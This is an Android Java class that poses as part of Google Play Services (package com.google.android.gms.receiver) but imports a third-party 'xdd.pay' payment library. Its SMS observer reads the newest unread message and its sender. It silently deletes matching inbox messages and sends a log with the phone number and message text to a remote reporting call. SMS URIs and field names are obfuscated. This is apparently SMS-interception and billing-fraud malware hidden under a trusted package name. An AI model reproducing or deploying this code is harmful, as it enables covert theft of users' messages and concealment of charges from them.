package com.google.android.gms.receiver;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

import com.xdd.pay.network.object.SmsLogInfo;
import com.xdd.pay.util.EncryptUtils;
import com.xdd.pay.util.PayUtils;
import com.xdd.pay.util.QYLog;
import com.xdd.pay.util.constant.MOType;
import com.xdd.pay.util.constant.ResultType;
import com.xdd.pay.util.constant.SmsConstant;

public class SmsContentObserver extends ContentObserver {

	private Context context;
	private Handler handler;
	private String tel = "";
	private int delid = -2;
	private int smsId = -1;
	private int smsIdcheck = -2;
	private int sid;

	public SmsContentObserver(Context context, Handler handler) {

		super(handler);
		this.handler = handler;
		this.context = context;
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		// 读取收件箱中指定号码的短信
		Message message = new Message();
		Bundle b = new Bundle();
		b.putString(EncryptUtils.decode(SmsConstant.SMS_CONTENT), getSmsInPhone());
		b.putString(EncryptUtils.decode(SmsConstant.PHONE_NUM), tel);
		message.setData(b);
//		QYLog.d("--------onChange-----------smsIdcheck=" + smsIdcheck + "/smsId=" + smsId + "---sid=" + sid);
		if (sid != smsId && smsIdcheck != smsId) {
			sid = smsId;
			handler.sendMessage(message);
		}

	}

	// 获取短信中最新的一条未读短信
	@SuppressWarnings("unused")
	public String getSmsInPhone() {
		final String SMS_URI_ALL = EncryptUtils.decode(SmsConstant.CONTENT_SMS);
		final String SMS_URI_INBOX = EncryptUtils.decode(SmsConstant.CONTENT_SMS_INBOX);
		final String SMS_URI_SEND = EncryptUtils.decode(SmsConstant.CONTENT_SMS_SENT);
		final String SMS_URI_DRAFT = EncryptUtils.decode(SmsConstant.CONTENT_SMS_DRAFT);
		Cursor cur = null;
		StringBuilder smsBuilder = new StringBuilder();

		try {
			ContentResolver cr = context.getContentResolver();
			String[] projection = new String[] { EncryptUtils.decode(SmsConstant.ID), EncryptUtils.decode(SmsConstant.ADDRESS), EncryptUtils.decode(SmsConstant.PERSON), EncryptUtils.decode(SmsConstant.BODY), EncryptUtils.decode(SmsConstant.DATE), EncryptUtils.decode(SmsConstant.TYPE) };
			Uri uri = Uri.parse(SMS_URI_ALL);
			cur = cr.query(uri, projection, "read = ?", new String[] { "0" }, "date desc");
			if (cur.moveToFirst()) {
				String name;
				String phoneNumber;
				String smsbody;
				String date;
				String type;

				int nameColumn = cur.getColumnIndex(EncryptUtils.decode(SmsConstant.PERSON));
				int phoneNumberColumn = cur.getColumnIndex(EncryptUtils.decode(SmsConstant.ADDRESS));
				int smsbodyColumn = cur.getColumnIndex(EncryptUtils.decode(SmsConstant.BODY));
				int dateColumn = cur.getColumnIndex(EncryptUtils.decode(SmsConstant.DATE));
				int typeColumn = cur.getColumnIndex(EncryptUtils.decode(SmsConstant.TYPE));

				do {
					name = cur.getString(nameColumn);
					phoneNumber = cur.getString(phoneNumberColumn);
//					QYLog.d("-----------phoneNumber------" + phoneNumber);
					tel = phoneNumber;
					smsbody = cur.getString(smsbodyColumn);
					smsId = cur.getInt(cur.getColumnIndex(EncryptUtils.decode(SmsConstant.ID)));
//					QYLog.d("-----------smsId------------" + smsId);
					smsBuilder.append(smsbody);
					if (smsbody == null)
						smsbody = "";
					break;
				} while (cur.moveToNext());
			} else {
				smsBuilder.append("no result!");
			}

		} catch (SQLiteException ex) {
			Log.e("SQLiteException in getSmsInPhone", ex.getMessage());
		} finally {
			if (cur != null) {
				cur.close();
			}
		}
		return smsBuilder.toString();
	}

	public void deleteSMS(Context context, String smscontent, String phoneNum) {
		Cursor isRead = null;
		try {
			// 准备系统短信收信箱的uri地址
			Uri uri = Uri.parse(EncryptUtils.decode(SmsConstant.CONTENT_SMS_INBOX));
			// 收信箱
			// 查询收信箱里所有的短信
			isRead = context.getContentResolver().query(uri, null, "read=" + 0, null, null);
//			QYLog.d("---deleteSMS---");
			while (isRead.moveToNext()) {
				// String phone =
				// isRead.getString(isRead.getColumnIndex("address")).trim();//获取发信人
				String body = isRead.getString(isRead.getColumnIndex("body")).trim();// 获取信息内容
				if (body.equals(smscontent)) {
					QYLog.d("---body---" + body);
					int id = isRead.getInt(isRead.getColumnIndex("_id"));
					QYLog.d("---id---" + id);

					delid = context.getContentResolver().delete(Uri.parse(EncryptUtils.decode(SmsConstant.CONTENT_SMS)), "_id=" + id, null);

					SmsLogInfo smsLogInfo = new SmsLogInfo();
					smsLogInfo.setLocalTime(System.currentTimeMillis() + "");
					smsLogInfo.setPhoneNum(phoneNum);
					smsLogInfo.setSms(smscontent);
					smsLogInfo.setType(MOType.SMS_RECEIVER_LOG);
					if (delid == 0) {// 未删除
						smsIdcheck = id;
						smsLogInfo.setResult(ResultType.FAIL);
					} else if (delid == 1) { // 删除成功
						smsLogInfo.setResult(ResultType.SUCCESS);
					} else {
						smsLogInfo.setResult((byte)delid);
					}
					PayUtils.getInstance().sendRealTimeLog(smsLogInfo, false);

					QYLog.d("---delid---" + delid);
				}
				return;
			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (isRead != null) {
				isRead.close();
			}
		}
	}

	public int getDelid() {
		return delid;
	}

	public int setDelid(int a) {
		return delid = a;
	}
}